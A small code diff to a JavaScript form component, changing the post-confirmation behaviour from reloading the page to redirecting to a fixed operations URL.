@@ -215,7 +215,7 @@ const FormCard = ({
       confirmButtonText: 'Ok',
     }).then((result) => {
       if (result.isConfirmed) {
-        window.location.reload();
+        window.location.href = 'https://operaciones.contactcentergrupo.com/DiBanka';
       } 
     });
   }
